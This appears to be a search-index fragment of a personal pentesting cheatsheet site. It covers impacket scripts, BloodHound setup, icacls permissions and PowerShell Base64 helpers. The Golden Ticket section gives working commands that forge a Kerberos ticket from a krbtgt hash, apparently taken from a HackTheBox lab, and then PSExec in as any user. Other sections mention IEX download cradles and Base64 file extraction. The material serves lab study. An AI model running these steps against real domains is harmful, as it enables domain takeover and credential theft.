<li><code>Get-GPPPassword.py</code>: This example extracts and decrypts Group Policy Preferences passwords using streams for treating files instead of mounting shares. Additionally, it can parse GPP XML files offline.</li> <li><code>mqtt_check.py</code>: Simple MQTT example aimed at playing with different login options. Can be converted into a account/password brute forcer quite easily.</li> <li><code>rdp_check.py</code>: [MS-RDPBCGR] and [MS-CREDSSP] partial implementation just to reach CredSSP auth. This example tests whether an account is valid on the target host.</li> <li><code>sniff.py</code>: Simple packet sniffer that uses the pcapy library to listen for packets in # transit over the specified interface.</li> <li><code>sniffer.py</code>: Simple packet sniffer that uses a raw socket to listen for packets in transit corresponding to the specified protocols.</li> <li><code>ping.py</code>: Simple ICMP ping that uses the ICMP echo and echo-reply packets to check the status of a host. If the remote host is up, it should reply to the echo probe with an echo-reply packet.</li> <li><code>ping6.py</code>: Simple IPv6 ICMP ping that uses the ICMP echo and echo-reply packets to check the status of a host.</li> </ul>"},{"location":"Cheatsheets/Windows/2022-07-10-bloodhound/","title":"BloodHound","text":"<p>BloodHound is a tool for visualising and analyzing Active Directory networks so that you can better identify misconfigurations and paths which would allow you to take full control of the Domain Controller (which is the ultimate goal in any Active Directory engagement)</p> <p>It uses Neo4j to draw interactive graphs which show the links between the objects and Organizational Units within the Domain, it's easier to show than it is to explain:</p> <p></p> <p>Each one of those nodes and paths can be interacted with for more information. You can mark each node as \"owned\" or \"high value\" depending on what you're looking for. And using some of the prebuilt data queries (the one above is showing \"Shortest Path to Domain Admin\") you can easily see the route you need to take to elevate your privileges and permissions within an AD network.</p> <p>Fun fact: Blood Hound in German is Blut Hund, which appears to be the root of the English version. {: .prompt-info }</p>"},{"location":"Cheatsheets/Windows/2022-07-10-bloodhound/#neo4j-docker","title":"Neo4j Docker","text":"<p>Getting Neo4j installed feels like a chore, so we can just make use of a docker image instead:</p> <pre><code>docker pull neo4j:latest\ndocker run -p 7474:7474 -p 7687:7687 -d --env NEO4J_AUTH=neo4j/test neo4j:latest\n</code></pre> <p>We only really need those two ports for BloodHound to be able to communicate with so those two commands will do. If you want a more secure password, change the value of <code>NEO4J_AUTH=neo4j/test</code> to something else.</p>"},{"location":"Cheatsheets/Windows/2022-07-10-bloodhound/#installing-bloodhound","title":"Installing BloodHound","text":"<p>So I don't actually recommend building this thing, instead I recommend using the Release builds from Github which are kept in line with the <code>master</code> branch of BloodHound.</p> <p>BloodHound Github Release Page</p> <p>Grab the latest one from there, I'm currently using 4.2.0 (#blazeit) but you're likely reading this at some unspecified point in the future, so use whatever is the latest.</p> <p>Running it is straightfowards:</p> <pre><code># Assuming you've downloaded the release zip already\n7z x BloodHound-linux-x64.zip\ncd BloodHound-linux-x64/\n./BloodHound --no-sandbox\n</code></pre>"},{"location":"Cheatsheets/Windows/2022-07-10-bloodhound/#getting-data","title":"Getting Data","text":"<p>BloodHound data doesn't grow on trees, we're going to have to use one of the kindly provided \"Collectors\" to do that for us.</p> <p></p> <p>My preferred choice is the \"SharpHound.ps1\" script as I can load that in remotely using an IEX download cradle but it's dealers choice, both usually work a treat although you're going to want a fairly stable TTY in order to run them.</p> <p>Another good choice is the good old impacket-smbserver.</p>"},{"location":"Cheatsheets/Windows/2022-08-10-golden-ticket/","title":"Golden Tickets","text":"<p>need to get hold of the <code>krbtgt</code> hash (this is the key that Windows uses to sign tickets)</p> <p>usually done by performing a DCSync and then performing a secretsdump</p> <pre><code># to get the `-domain-sid` \nGet-ADDomain htb.local\n</code></pre> <pre><code>impacket-ticketer -nthash 819af826bb148e603acb0f33d17632f8 -domain-sid S-1-5-21-3072663084-364016917-1341370565 -domain htb.local WhateverWeWant\n</code></pre> <p>The above command will create a file with the ticket information all you need to do to use it is set it as an environment variable:</p> <pre><code>export KRB5CCNAME=WhateverWeWant.ccache\n</code></pre> <p>Then we can PSExec in as literally any username we like because we just created a ticket with signed by the Domain, and everything within the Domain implicitly trusts anything signed by the Domain and doesn't bother to check, because that's how that works.</p> <pre><code>impacket-psexec -k -debug -no-pass htb.local\\WhateverWeWant@forest\n</code></pre> <p>Use the machine name/domain name to connect, this particular command doesn't like IP addresses (add to /etc/hosts) {: .prompt-tip }</p>"},{"location":"Cheatsheets/Windows/2022-08-10-golden-ticket/#overcoming-any-clock-skew-issues","title":"Overcoming any Clock Skew Issues","text":"<p>Work out what Timezone the machine is in (roughly) and set that as your <code>localtime</code> in this case setting it to US/Pacific got us to the same caldendar date, which is the important bit of setting the Timezone.</p> <pre><code>sudo su\ncat /usr/share/zoneinfo/US/Pacific &gt; /etc/localtime\nexit\n</code></pre> <p>If you still get a Clock Skew error run <code>date</code> on the target and just set your PC time to whatever time is on the box. Kerberos has issues if there is a difference of 10 minutes or so and some machines end up quite badly out of sync because their local NTP server is crap or you're attacking a VM with no external internet access so it can't update that way.</p> <pre><code>sudo date -s 18:05:49\n</code></pre> <p>Rerun the <code>impacket-ticketer</code> command at this point to refresh the ticket. {: .prompt-tip }</p>"},{"location":"Cheatsheets/Windows/2023-01-15-101_icalcs/","title":"ICACLs 101","text":"<p>Understanding Windows permissions</p> <p>MSDN Link</p> <pre><code>icacls &lt;FileName&gt; [/grant[:r] &lt;Sid&gt;:&lt;Perm&gt;[...]] [/deny &lt;Sid&gt;:&lt;Perm&gt;[...]] [/remove[:g|:d]] &lt;Sid&gt;[...]] [/t] [/c] [/l] [/q] [/setintegritylevel &lt;Level&gt;:&lt;Policy&gt;[...]]\nicacls &lt;Directory&gt; [/substitute &lt;SidOld&gt; &lt;SidNew&gt; [...]] [/restore &lt;ACLfile&gt; [/c] [/l] [/q]]\n</code></pre>"},{"location":"Cheatsheets/Windows/2023-01-15-101_icalcs/#reading-the-output","title":"Reading the output","text":"<p>See below for the full list but the main ones we're really interested in are:</p> <ul> <li><code>F    (full access)</code></li> <li><code>RX   (read and execute access)</code></li> </ul> <p>Full access obviously gives us full control over the file, (Read, Write, Execute, Delete), and RX gives us Read and Execute capabilities.</p> <p>And just after glancing at the others to see if anything else sticks out <code>WDAC</code> actually seems like it could be an important one to keep an eye out for as it seems to be able to control what can and can't run on a system MSDN on WDAC</p> <pre><code>PS C:\\Users\\MrBullsec\\Documents&gt; icacls .\\notes_checklist.md\n.\\notes_checklist.md NT AUTHORITY\\SYSTEM:(I)(F)\n                     BUILTIN\\Administrators:(I)(F)\n                     CC1\\MrBullsec:(I)(F)\n</code></pre> <pre><code>    SIDs may be in either numerical or friendly name form. If you use a numerical form, affix the wildcard character * to the beginning of the SID.\n\n    icacls preserves the canonical order of ACE entries as:\n\n        Explicit denials\n        Explicit grants\n        Inherited denials\n        Inherited grants\n\n    Perm is a permission mask that can be specified in one of the following forms:\n\n        A sequence of simple rights:\n\n        F (full access)\n        M (modify access)\n        RX (read and execute access)\n        R (read-only access)\n        W (write-only access)\n        A comma-separated list in parenthesis of specific rights:\n        D (delete)\n        RC (read control)\n        WDAC (write DAC)\n        WO (write owner)\n        S (synchronize)\n        AS (access system security)\n        MA (maximum allowed)\n        GR (generic read)\n        GW (generic write)\n        GE (generic execute)\n        GA (generic all)\n        RD (read data/list directory)\n        WD (write data/add file)\n        AD (append data/add subdirectory)\n        REA (read extended attributes)\n        WEA (write extended attributes)\n        X (execute/traverse)\n        DC (delete child)\n        RA (read attributes)\n        WA (write attributes)\n\n    Inheritance rights may precede either Perm form, and they are applied only to directories:\n\n    (OI): object inherit\n    (CI): container inherit\n    (IO): inherit only\n    (NP): do not propagate inherit\n</code></pre>"},{"location":"Recon/mapping/","title":"Application Mapping","text":""},{"location":"Recon/recon/","title":"Recon and Information Gathering","text":"<p>Gathering information and performing Recon is one of the most important steps you will take when performing a penetration test.</p> <p>The data and information that you gather at this stage will inform the rest of your testing, so it's worth doing a good initial job so that you don't have to go back and perform additional discovery against the target.</p>"},{"location":"Recon/recon/#dns","title":"DNS","text":""},{"location":"Recon/recon/#infrastructure","title":"Infrastructure","text":""},{"location":"Recon/recon/#fuzzing","title":"Fuzzing","text":""},{"location":"Recon/recon/#_1","title":"Recon and Information Gathering","text":""},{"location":"Web/web_hacking/","title":"Web Application Hacking","text":""},{"location":"Windows/PowerShell/","title":"PowerShell","text":""},{"location":"Windows/PowerShell/#useful-functions","title":"Useful Functions","text":"<pre><code># Convert a file to Base64\n[convert]::ToBase64String((Get-Content -path \"your_file_path\" -Encoding byte))\n</code></pre> <p>The above comes in handy for file extraction because you can just copy the Base64 String to another box and decode then pipe to a file</p> <pre><code># Encode String as Base64\n[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('Mot\u00f6rhead'))\n\n# Decode from Base64 String\n[Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('TW90w7ZyaGVhZA=='))\n</code></pre>"},{"location":"Windows/windows_101/","title":"Windows 101","text":"<pre><code>$P = Get-Process\nWrite-Output $P\n</code></pre>"}]}